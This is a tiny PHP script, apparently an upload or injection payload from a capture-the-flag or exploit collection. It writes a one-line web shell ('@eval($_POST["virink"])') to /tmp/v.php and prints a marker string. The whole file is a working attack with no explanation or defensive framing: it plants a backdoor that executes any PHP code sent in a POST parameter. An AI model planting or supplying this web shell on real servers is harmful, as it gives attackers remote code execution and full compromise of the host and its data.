@<?php

file_put_contents("/tmp/v.php", '<?php @eval($_POST["virink"]);');

echo "virink";